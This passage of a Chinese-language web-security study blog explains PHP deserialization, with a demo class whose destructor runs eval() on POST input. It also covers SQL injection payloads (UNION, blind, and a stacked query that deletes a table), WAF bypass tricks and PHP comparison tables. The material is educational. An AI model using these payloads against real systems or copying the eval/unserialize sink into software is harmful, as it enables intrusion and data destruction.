class="comment">//为test对象中的a属性赋值</span></span><br><span class="line">	<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">echo_var</span>();  <span class="comment">//调用class_test中的echo_var()函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>把对象转换为字节序列的过程称为对象的序列化。</p>
+<p>PHP中所有的值都可以用函数 <code>serialize()</code> 返回的一个包含字节流的字符串来表示 , <strong>序列化一个对象会保存当前对象的所有变量 , 会保留类的名字 , 但是不会保存对象的方法</strong>。</p>
+<p>PHP反序列化就是通过 <code>unserialize()</code> 重新把字符串变回原来的值 . <strong>如果反序列化的变量为对象( Object ) , 那么在成功重构对象后PHP会自动调用 <code>__wakeup()</code>成员方法</strong> .</p>
+<p>简单的来说 , PHP序列化就是把代码中所有的 对象 , 类 , 数组 , 变量 , 匿名函数 ... 全部转换为一个字符串 , 提供给用户传输和存储 . 而反序列化就是把字符串重新转换为 对象 , 类 , 数组 , 变量 , 匿名函数 . 通过这种相互转换 ,从而完成 <strong>数据持久化</strong>。</p>
+<p><strong><code>private </code>, <code>protected</code> , <code>public</code> , 它们经过序列化后的字符串是有区别的</strong></p>
+<p><strong>private</strong><br><code>数据类型:属性名长度:&quot;\00类名\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;</code></p>
+<p><strong>protected</strong><br><code>数据类型:属性名长度:&quot;\00*\00属性名&quot;;数据类型:属性值长度:属性值</code></p>
+<p><strong>public</strong><br><code>数据类型:属性名长度:属性名;数据类型:属性值长度:属性值</code></p>
+<p>private属性序列化的时候格式是 %00类名%00成员名</p>
+<p>protected属性序列化的时候格式是 %00*%00成员名</p>
+<p>关键要点：</p>
+<p>在Private 权限私有属性序列化的时候格式是 %00类名%00属性名</p>
+<p>在Protected 权限序列化的时候格式是 %00*%00属性名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">序列化只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</span><br><span class="line">(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</span><br><span class="line"></span><br><span class="line">这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</span><br><span class="line"></span><br><span class="line">(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</span><br><span class="line"></span><br><span class="line">因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><em>前面有两个下划线__</em></p>
+<table>
+<thead>
+<tr>
+<th>__wakeup()</th>
+<th>使用unserialize时触发</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>__sleep()</strong></td>
+<td>使用serialize时触发</td>
+</tr>
+<tr>
+<td><strong>__destruct()</strong></td>
+<td>对象被销毁时触发</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>在对象上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td>__callStatic()</td>
+<td>在静态上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td><strong>__get()</strong></td>
+<td>用于从不可访问的属性读取数据</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>用于将数据写入不可访问的属性</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>在不可访问的属性上调用isset()或empty()触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>在不可访问的属性上使用unset()时触发</td>
+</tr>
+<tr>
+<td><strong>__toString()</strong></td>
+<td>把类当作字符串使用时触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>当脚本尝试将对象调用为函数时触发</td>
+</tr>
+<tr>
+<td><strong>__construct()</strong></td>
+<td>在类被创建成对象前调用</td>
+</tr>
+</tbody></table>
+<h3 id="利用反序列化漏洞"><a href="#利用反序列化漏洞" class="headerlink" title="利用反序列化漏洞"></a>利用反序列化漏洞</h3><p>\1. PHP序列化给我们传递对象提供了一种简单的方法 , 反序列化的数据本质上是没有危害的<br>\2. 但是用户可控参数的反序列化数据是有危害的<br>\3. 当用户利用魔术方法或者其他敏感函数进行恶意操作时 , 会出现安全问题</p>
+<h4 id="利用魔术方法"><a href="#利用魔术方法" class="headerlink" title="利用魔术方法"></a>利用魔术方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line"><span class="variable">$test_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当POST传入的参数是<code>phpinfo()</code>就可以看到php的配置信息了。</p>
+<figure class="highlight plaintext"><figcaption><span>PHP 反序列化漏洞的方法或者说流程</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) 寻找 unserialize() 函数的参数是否有我们的可控点</span><br><span class="line"></span><br><span class="line">(2) 寻找我们的反序列化的目标，重点寻找 存在 wakeup() 或 destruct() 魔法函数的类</span><br><span class="line"></span><br><span class="line">(3) 一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</span><br><span class="line"></span><br><span class="line">(4) 找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fish-pompom/p/11126473.html">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p>
+<hr>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。本节用一些简单的例子详细介绍SQL注入的基础，包括数字型注入、UNION注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入等注入方式和对应的利用技巧。</p>
+<h3 id="数字型和UNION-型注入"><a href="#数字型和UNION-型注入" class="headerlink" title="数字型和UNION 型注入"></a>数字型和UNION 型注入</h3><p>数字型的特征是会对输入的表达式进行运算：</p>
+<p><code>?id=2</code>和<code>?id=3-1</code>的结果是一样的</p>
+<p>在源码上的表现是输入点<code>$_GET[&#39;id&#39;]</code>附近没有单引号或者双引号</p>
+<p>浏览器会自动将URL中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p>
+<p>使用UNION语句时，不会显示我们所期望的内容的为问题，事实上，MySQL确实查询出了两行记录，但是PHP代码决定了该页面只显示一行记录，所以我们需要将账号密码的记录显示在查询结果的第一行。此时有多种办法，如可以继续在原有数据后面加上“limit 1，1”参数（显示查询结果的第2条记录）。“limit 1，1”是一个条件限定，作用是取查询结果第1条记录后的1条记录。又如，指定id=-1或者一个很大的值，使得图1-2-9中的第一行记录无法被查询到，这样结果就只有一行记录了。</p>
+<h5 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h5><ol>
+<li><p>获取库名<code>?id=-1 union select database()</code>在这个语句中要注意union前后查询的列数要一致。所以先用<code>order by 1/2/3/4</code>确定本来查询的列数</p>
+</li>
+<li><p>获取表名<code>?id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()</code> </p>
+<p>MySQL 5.0版本后，默认自带一个数据库information_schema，MySQL的所有数据库名、表名、字 段名都可以从中查询到。</p>
+<p>table_name字段是information_schema库的tables表的表名字段。表中还有数据库名字段table_ schema 。</p>
+</li>
+<li><p>获取字段名<code>?id=-1 union select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;</code></p>
+</li>
+<li><p>获取值<code>?id=-1 union select ....(字段名) from 表名</code></p>
+</li>
+</ol>
+<h3 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h3><p>   与数字型相比，只是在GET参数输入的地方包裹了单引号，让其变成字符串。</p>
+<p>   <code>‘1’=1， ‘1a’=1,  &#39;a&#39;=0;</code></p>
+<p>   在MySQL中，等号两边如果类型不一致，则会发生强制转换。当数字与字符串数据比较时，字符串将 被转换为数字，再进行比较。字符串1与数字相等；字符串1a被强制转换成1，与1相 等；字符串a被强制转换成0所以与0相等。</p>
+<p>   在注入时，尝试使用单引号来闭合前面的单引号，再用“--%20”或“%23”注释后面的语句。注意，这里一定要URL编码，空格的编码是“%20”，“＃”的编码是“%23”。</p>
+<p>当然，除了注释，也可以用单引号来闭合后面的单引号。</p>
+<hr>
+<p>布尔盲注就是利用AND条件前后都要满足，来推断出数据的技术。</p>
+<p>利用MySQL自带的函数进行数据截取，如substring()、mid()、 substr ()来快速推测出数据</p>
+<p>如<code>id=1&#39;and (select mid((select concat(user， 0x7e，pwd)from wp_user)，1，1))=&#39;a&#39;%23</code>可以判断出user的第一位是不是'a'</p>
+<h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p><img src="C:\Users\崔凌敏\Desktop\西提埃夫\第七周\img\30.png" alt="30" loading="lazy"></p>
+<p>部分源码如上</p>
+<p>可以在闭合单引号后执行任何SQL语句</p>
+<p><code>id=1&#39;; delete * from wp_files; #</code> 删除了表wp_files的所有数据</p>
+<p>;号用来分开两个SQL语句</p>
+<h2 id="SQL注入bypass方法"><a href="#SQL注入bypass方法" class="headerlink" title="SQL注入bypass方法"></a>SQL注入bypass方法</h2><p>利用一些方法去绕过WAF</p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在SQL注入时当空格被过滤了，在MySQL中可以使用：</p>
+<p><code>%09%0A %0B %0C %0D %A0 %20 /**/</code></p>
+<blockquote>
+<p><code>%09%0A</code> %09 ascii 对应的是水平制表符  %0A是换行</p>
+<p><code>%0B</code> 垂直制表符</p>
+<p><code>%0C</code> 换页键</p>
+<p><code>%0D</code> 回车键</p>
+<p><code>%A0</code> 是扩展的ascii 代表空格</p>
+<p><code>%20</code> 空格</p>
+</blockquote>
+<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>在SQL注入中使用的注释符主要为：<code>#</code>,<code> --+</code>，<code>/*xxx*/</code>，<code>/*!xxx*/</code>，<code>/*!50000xxx*/</code> ，在实际场景中可以将这些注释符嵌套应用，会有意想不到的效果，比如只需利用一个<code>*/</code>闭合多个<code>/*</code></p>
+<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>经常在SQL注入时使用一些特殊符号即可绕过很多WAF规则，比如<code>~</code>，<code>!</code>， <code>， @</code>，<code> &#123;x key&#125;</code>， <code>1.1</code>， <code>1e1</code>，<code> ()</code>， <code>emoji表情符号</code>， <code>@:=</code>等，在实际场景中将这些符号灵活应用就可以绕过很多WAF</p>
+<h3 id="WAF过滤掉"><a href="#WAF过滤掉" class="headerlink" title="WAF过滤掉()"></a>WAF过滤掉()</h3><p>这样的话就不能直接使用自带的函数，这时可以使用like或者regexp获取数据</p>
+<ul>
+<li><p>LIKE</p>
+<p>匹配整个列。如果被匹配的文本在列值 中出现，LIKE将不会找到它，相应的行也不被返回（除非使用 通配符）。</p>
+</li>
+<li><p>REGEXP在列值内进行匹配，如果被匹配的文本在 列值中出现，REGEXP将会找到它，相应的行将被返回。</p>
+</li>
+</ul>
+<p><strong>使用LIKE的话还有用到通配符</strong> </p>
+<blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SQL">SQL</a>中，通配符可用于"LIKE"表达式中，百分号(%)匹配零个或多个字符，下划线(_)匹配单个字符。</p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Transact-SQL">Transact-SQL</a>中还支持使用方括号("["和"]")来匹配列表集和字符范围，在前面加一个 ^ 表示否定，将匹配所有未在括号中指定的字符。</p>
+<p>在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Microsoft_Access">Microsoft Access</a>中，通配符可用于"LIKE"表达式中，星号(*)匹配零个或多个字符，问号(?)匹配单个字符。在 SAP 中加号(+)匹配一个字符。</p>
+</blockquote>
+<p><strong>但是，如果使用正则的话，就直接 <code>SELECT * FROM STU WHERE SNO REGEXP &#39;108&#39;</code>; 这样的操作即可！</strong></p>
+<h4 id="过滤SELECT"><a href="#过滤SELECT" class="headerlink" title="过滤SELECT"></a>过滤SELECT</h4><p>将SELECT替换成空，可以用嵌套的方式绕过 <code>selselectect</code> 过滤掉中间的select两边合上还是select</p>
+<h3 id="一些其他方法"><a href="#一些其他方法" class="headerlink" title="一些其他方法"></a>一些其他方法</h3><ul>
+<li>过滤逗号了可以使用join；</li>
+<li>过滤了关键字可以使用编码结合注释；</li>
+<li>过滤常用函数可以找非常用函数代替等等。</li>
+<li>大小写组合</li>
+</ul>
+<hr>
+<h1 id="php数据比较"><a href="#php数据比较" class="headerlink" title="php数据比较"></a>php数据比较</h1><pre><code>                                                        **多种类型比较**
+</code></pre>
+<table>
+<thead>
+<tr>
+<th align="left">运算数 1 类型</th>
+<th align="left">运算数 2 类型</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">null 或 string</td>
+<td align="left">string</td>
+<td align="left">将 <strong><code>null</code></strong> 转换为 “”，进行数字或词汇比较</td>
+</tr>
+<tr>
+<td align="left">bool 或 null</td>
+<td align="left">任何其它类型</td>
+<td align="left">转换为 bool，**<code>false</code>** &lt; <strong><code>true</code></strong></td>
+</tr>
+<tr>
+<td align="left">object</td>
+<td align="left">object</td>
+<td align="left">内置类可以定义自己的比较，不同类不能比较，相同类和数组同样方式比较属性（PHP 4 中），PHP 5 有其自己的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.object-comparison.php">说明</a></td>
+</tr>
+<tr>
+<td align="left">string、resource、int、float</td>
+<td align="left">string、resource、int、float</td>
+<td align="left">将字符串和资源转换成数字，按普通数学比较</td>
+</tr>
+<tr>
+<td align="left">array</td>
+<td align="left">array</td>
+<td align="left">具有较少成员的数组较小，如果运算数 1 中的键不存在于运算数 2 中则数组无法比较，否则挨个值比较（见下例）</td>
+</tr>
+<tr>
+<td align="left">object</td>
+<td align="left">任何其它类型</td>
+<td align="left">object 总是更大</td>
+</tr>
+<tr>
+<td align="left">array</td>
+<td align="left">任何其它类型</td>
+<td align="left">array 总是更大</td>
+</tr>
+</tbody></table>
+<pre><code>                                                            **松散比较`==`**
+</code></pre>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><code>true</code></strong></th>
+<th align="left"><strong><code>false</code></strong></th>
+<th align="left"><code>1</code></th>
+<th align="left"><code>0</code></th>
+<th align="left"><code>-1</code></th>
+<th align="left"><code>&quot;1&quot;</code></th>
+<th align="left"><code>&quot;0&quot;</code></th>
+<th align="left"><code>&quot;-1&quot;</code></th>
+<th align="left"><strong><code>null</code></strong></th>
+<th align="left"><code>[]</code></th>
+<th align="left"><code>&quot;php&quot;</code></th>
+<th align="left"><code>&quot;&quot;</code></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>true</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>1</code></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>0</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong>*</td>
+<td><strong><code>false</code></strong>*</td>
+</tr>
+<tr>
+<td align="left"><code>-1</code></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;1&quot;</code></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;0&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;-1&quot;</code></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>null</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>true</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>[]</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;php&quot;</code></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong>*</td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong>*</td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>true</code></strong></td>
+</tr>
+</tbody></table>
+<pre><code>                                                        **严格比较 `===`**
+</code></pre>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><code>true</code></strong></th>
+<th align="left"><strong><code>false</code></strong></th>
+<th align="left"><code>1</code></th>
+<th align="left"><code>0</code></th>
+<th align="left"><code>-1</code></th>
+<th align="left"><code>&quot;1&quot;</code></th>
+<th align="left"><code>&quot;0&quot;</code></th>
+<th align="left"><code>&quot;-1&quot;</code></th>
+<th align="left"><strong><code>null</code></strong></th>
+<th align="left"><code>[]</code></th>
+<th align="left"><code>&quot;php&quot;</code></th>
+<th align="left"><code>&quot;&quot;</code></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>1</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>0</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>-1</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;1&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;0&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
